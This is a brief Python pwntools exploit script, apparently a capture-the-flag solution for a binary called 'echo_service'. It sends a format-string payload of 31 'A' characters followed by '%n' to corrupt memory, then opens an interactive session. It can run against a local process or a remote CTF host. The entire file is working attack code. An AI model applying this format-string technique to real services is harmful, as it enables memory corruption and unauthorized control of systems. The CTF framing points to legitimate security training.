from pwn import *
from struct import *

def exploit(r):

    payload = ''
    payload += 'A'*31 + '%n'
    r.recvuntil(' : ')
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    name = './echo_service'
    binary = ELF(name)
    context.log_level = 'DEBUG'

    if len(sys.argv) > 1:
        r = remote('university.opentoallctf.com', '30007')
    else:
        r = process(name)
        pause()

    exploit(r)

